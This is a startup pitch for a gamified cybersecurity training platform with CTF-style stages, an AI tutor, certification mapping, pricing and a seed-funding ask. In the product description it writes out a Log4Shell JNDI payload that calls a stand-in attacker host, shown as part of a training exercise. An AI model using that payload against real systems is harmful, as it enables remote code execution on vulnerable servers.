# Kryptós CronOS — The Pitch
**May 2026 | For people who get it**
**Last updated: 2026-05-30 (v1.23.0)**

---

## Here's the problem in one sentence

There are 3.5 million unfilled cybersecurity jobs and every single training product on the market is either boring as hell or impossible to use without a CS degree.

We're fixing that.

---

## What we built

Kryptós CronOS teaches cybersecurity the way it should have always been taught — by actually doing it.

Not watching a guy on YouTube explain SQL injection. Not reading a 400-page study guide. **Actually running the exploit in a simulated environment, on a replica of the real server where it happened.**

Stage 8? You're in a terminal, feeding `${jndi:ldap://attacker.com/x}` into a log parser, watching it call back to your LDAP server — the exact same trick that took down half the internet in December 2021 (Log4Shell, CVSS score: 10.0, the highest possible rating).

Stage 9? You're scanning a network, identifying port 445 open on a Windows box, and exploiting EternalBlue — the NSA-built exploit that WannaCry used to encrypt hospitals across 150 countries.

Then you capture a flag, earn XP, unlock a badge, and the leaderboard updates in real time.

It's a game. It's also real security training. And that combination is genuinely rare.

---

## What exists today (v1.17.0 — live at kryptoscronos.com)

This isn't a pitch deck with a mockup. It's a working product:

- **458 fully built stages** across 38 curriculum epochs and 10 learning tracks
- **7-day free trial → Pro paywall** — Stripe checkout (monthly $13.99 / annual $99, SAVE 41%); webhook lifecycle handling; no credit card required to start
- **ARIA AI tutor** — live in production, powered by Claude Haiku, uses Socratic coaching (guides thinking, doesn't give away answers)
- **Adaptive difficulty engine** — `computeStageScore` (time + hints + attempts), +20% XP bonus for clean solves, adaptive ARIA cooldown for Pro users
- **Certificate paths** — live at `/certs`; structured learning paths aligned to CompTIA Security+ and ISC² CC certification objectives
- **CyberOps Associate exam readiness tracker** — live at `/cyberops`; maps 50+ Cisco stages to the 5 CBROPS 200-201 exam domains; weighted readiness ring; direct Cisco exam CTA
- **Full internationalization** — 7 languages: English, Spanish, French, German, Hindi, Portuguese, Polish
- **Daily streaks and milestone badges** — engagement loop that works
- **Real-time leaderboard** — global, daily, and weekly XP rankings
- **Trophy system** — 51 trophies, 8 rarity tiers, daily rotating showcase with atomic supply reservation
- **Avatar shop** — cosmetic items and trophies purchasable with earned coins
- **Stage completion emails** — fire-and-forget transactional email on every flag capture with XP, badge, streak, and next-stage link
- **Progress export** — downloadable PDF certificate: coins, stages, badges, streak, per-epoch breakdown
- **24 downloadable MCP server templates** — Python MCP server templates at `/downloads`
- **Investor Metrics panel** — WAU, 7-day return rate, funnel (registered→started→engaged→retained→power), per-epoch completion rates — live in admin
- **Admin dashboard** — user management, NDA signatories, CMS stage editor
- **Auth system** — PBKDF2-SHA-256, HMAC-signed HttpOnly cookies, nonce-based CSP, rate limiting
- **CI pipeline** — automated lint + type check + build + security audit on every commit — 0 ESLint errors
- **Deployed and running:** kryptoscronos.com · hello@kryptoscronos.com
- **GitHub:** github.com/jjfleetwood/kryptos-cronos

Built by one founder with an AI development environment. The adaptive difficulty engine, AI tutor, certification paths, and CyberOps exam tracker are not roadmap items — they're live and being used today.

---

## The 10 curriculum tracks we have today

### Track 1: Core Security (42 stages)
The entry point. Our First Journey (30 beginner-friendly CTF stages) + Foundations (12 stages on landmark attacks):
- SQL Injection (Heartland Payment Systems, $130M breach)
- XSS (Samy Kamkar's MySpace worm, 1 million accounts in 20 hours)
- Heartbleed (OpenSSL bug that leaked private keys for 2 years)
- Log4Shell (CVSS 10.0, still being exploited)
- WannaCry / EternalBlue (NHS shut down, $4B in damages)
- Capital One SSRF (100M customer records, metadata endpoint abuse)
- Equifax / Apache Struts (147 million Americans' SSNs, $575M FTC fine)

### Track 2: Cisco / Network Operations (38 stages across 3 epochs)
- **Cisco Core CVEs (12)** — real documented Cisco vulnerabilities (IOS XE, ASA, Smart Install, SNMP)
- **Cisco Enterprise Defense (13)** — enterprise network hardening and lateral movement scenarios
- **Cisco SecOps (13)** — alert triage and incident response modeled on Cisco XDR workflows

### Track 3: Tech Audit (48 stages across 4 epochs)
The enterprise compliance and SOC operations track:
- **Foundations** — ISACA, COBIT, CISA audit frameworks
- **Technical** — API security, secrets management, cloud IAM
- **Agentic Continuous Monitoring** — Claude tool use, MCP servers, AI-powered audit pipelines
- **Continuous Monitoring 2.0** — SIEM + ML, UEBA, NDR, CSPM, SOAR, deception/honeytokens, Zero Trust, XDR, continuous compliance, SOC maturity (MTTD/MTTR)

### Track 4: Threat Frameworks (24 stages)
- **MITRE ATT&CK** — All 12 tactic phases, nation-state TTPs
- **MITRE ATLAS** — AI/ML adversarial attacks (the MITRE framework for machine learning threats)

### Track 5: AI Security (12 stages)
- **OWASP LLM Top 10 2025** — Prompt injection, training data poisoning, model theft, insecure output handling

### Track 6: Quantum Era (30 stages across 3 epochs)
- Quantum threats to current cryptography
- Post-quantum cryptography (NIST PQC standards)
- Quantum key distribution infrastructure

### Track 7: Defend the Enterprise (22 stages across 2 epochs)
- **Cisco Advanced Defense (12)** — Firepower NGFW exploitation, advanced network scenarios (stage-m39 → stage-m50)
- **Cisco Umbrella / SASE (10)** — DNS tunneling, domain generation algorithms, network policy enforcement

### Track 8: Travel (80 stages across 4 epochs)
- Paris in July (20) — French culture, language, and Parisian life
- Milan in July (20) — Italian culture, fashion, and city life
- French Basics (20) — Essential French for travelers
- Italian Basics (20) — Essential Italian for travelers

### Track 9: Tapestry (12 stages)
- Cross-discipline security contexts and integrative challenges

### Track 10 (Extended curriculum — accessible via direct URL)
- **Crafts (30)** — Nail Arts, Hair Coloring, Hair Styling
- **Driving (24)** — Road to Your License, First Miles, Rules of the Road
- **Baseball (70)** — Seven-epoch progression from fundamentals to pitching strategy

---

## The certification paths that are already live

When someone finishes a track on Kryptós CronOS, that training maps to something real.

`/certs` — structured learning paths showing exactly which stages cover CompTIA Security+ and ISC² CC exam objectives. So a learner or their employer can see: "you've completed 68% of the Security+ curriculum."

`/cyberops` — a weighted readiness dashboard for the Cisco CyberOps Associate exam (200-201). 50 Cisco stages mapped to the 5 exam domains. Rings show live progress. Direct link to the Cisco exam registration.

The certifications are real. The alignment is real. The exam bodies are real. We're not selling a Kryptós certificate and calling it something — we're showing you how our content maps to the exams that employers actually require.

---

## The AI tutor that's already live

When you're stuck in the terminal and can't figure out why your payload isn't working, you click the ARIA button. It doesn't tell you the answer. It asks you a question.

"What happens when the application evaluates that string as a path? What would you expect to find there?"

It knows which stage you're on. It knows what the vulnerability is. It coaches you to the answer without giving it away. That's Socratic teaching applied to hands-on security training, running on Claude Haiku, live right now.

This is the AI layer that the other platforms are scrambling to bolt on. We shipped it.

---

## The gamification that actually works

- **Linear progression** — you earn access to the next stage by completing this one. No skipping.
- **XP + leaderboard** — people are competitive. This works.
- **Daily streaks** — consecutive-day engagement loop with streak-based badge rewards (3-day streak badge, 7-day streak badge)
- **Milestone badges** — XP milestones (1K XP, 5K XP) plus streak milestones
- **Stage badges** — unique badge for every stage completion ("Log4Shell Hunter," "Zero Day Scout," "SQL Slayer")
- **51-trophy collection system** — 8 rarity tiers, daily rotating showcase, atomic supply reservation keeps scarcity real
- **Reference drawer** — full briefing, technical reference, and attack diagram accessible mid-challenge without leaving the terminal

---

## Who's paying for this

### Direct to consumer
- Free tier: first few stages (gets you hooked)
- Pro: $13.99/month or $99/year (SAVE 41%) — everything, plus adaptive AI difficulty and certificates
- Team: $12/seat for companies with 10+ people in training

### Enterprise
- $8/seat/month at 100+ seats
- SSO, admin dashboards, compliance reporting, custom curriculum
- Target: financial services (SEC now requires cybersecurity disclosure), healthcare (HIPAA), defense contractors (CMMC)

### Sponsors — this is the fun part

Security vendors spend a fortune on brand awareness with practitioners. We give them a better channel than trade show booths:

- **CrowdStrike sponsors the "Threat Hunter" badge** — every learner who earns it gets a CrowdStrike exam voucher. CrowdStrike gets a qualified audience. We get a check.
- **AWS sponsors the SSRF stage** — co-branded "Cloud Security by AWS" stage with AWS free-tier credit for completions
- **CompTIA sponsors certificate verification** — cert discounts embedded in badge completion emails
- **SentinelOne sponsors a weekly CVE challenge** — "SentinelOne Threat Intelligence Challenge of the Week"
- **Cisco is the flagship integration** — this is bigger than a badge sponsorship:
  - **Cisco Talos** powers the weekly CVE challenge feed — real threat intelligence, new CTF every week, co-branded
  - **Cisco Umbrella** sponsors the DNS security curriculum track (already built)
  - **Cisco SecureX / XDR** sponsors an enterprise security operations track
  - **Cisco CyberOps Associate** certification — learners who complete the Cisco epochs get vouchers. Cisco gets a pipeline of certified practitioners who trained on their products. Live readiness tracker at `/cyberops`.
  - **Cisco DevNet** sponsors API security stages for developer-focused learners

### Hints — the Candy Crush model

Free users get one hint per stage, on the house. Hint 2 and hint 3? Watch a 30-second sponsor ad, or upgrade to Pro.

The ads are contextually matched. If you're stuck on the WannaCry stage, the hint comes from CrowdStrike. If you're grinding on SSRF and can't find the metadata endpoint, AWS shows you 30 seconds about cloud security. The ad is relevant, the audience is verified security practitioners, and the CPM reflects it: $50–$200.

The part that matters: every ad impression is also a Pro upgrade prompt. The user is already frustrated enough to want a hint — that's the highest-intent moment in the entire product. Duolingo built a billion-dollar business on this model. We're applying it to the most high-value professional audience in enterprise tech.

---

## Active technology partners (not vaporware)

| Partner | What they do for us today |
|---|---|
| **Vercel** | Hosting and CDN — every git push auto-deploys |
| **Upstash** | Serverless Redis — users, XP, leaderboard, streaks, NDAs |
| **Resend** | Transactional email — welcome, stage completion, password reset |
| **Anthropic** | Claude Haiku — powers ARIA AI tutor, live in production |
| **Stripe** | Payment processing — Pro subscriptions, webhook lifecycle |
| **GitHub** | Source control + automated CI pipeline |

---

## Why now

Three things converging:

1. **SEC's 2024 cybersecurity disclosure rules** mean every public company's board is asking "do our people actually know security?" The answer is currently no.
2. **AI is making attacks cheaper and faster.** The defender skill gap is widening in real time — and AI security (OWASP LLM Top 10, MITRE ATLAS) is an entirely new curriculum category that didn't exist 18 months ago.
3. **Gen Z learns differently.** Video and games, not textbooks. The platforms that figured out gaming (Duolingo, Brilliant) have proven the model works at scale.

We're bringing that model to the most high-stakes skill gap in enterprise tech, with an AI tutor already running.

---

## The ask

**$1.5M seed to get to Series A in 18 months.**

That buys:
- 2 engineers for a year ($720K)
- AI API budget for ARIA scaling and the adaptive personalization layer ($120K)
- GTM to get to 50,000 users and $1.2M ARR ($300K)
- Infrastructure and security hardening for enterprise sales ($80K)
- Legal, ops, reserve ($280K)

At $1.2M ARR with 50,000 users and a clear enterprise pipeline, Series A is a real conversation at a real valuation.

---

## The one-liner version

**Kryptós CronOS is Duolingo for cybersecurity — except instead of translating Spanish sentences, you're exploiting the same vulnerability that cost Equifax $575 million, with an AI tutor coaching you through it.**

If that sounds like something the market will pay for, let's talk.

---

*kryptoscronos.com | hello@kryptoscronos.com | github.com/jjfleetwood/kryptos-cronos*  
*Bolotin Enterprises, Inc. — Delaware C-Corp — incorporated May 23, 2026*
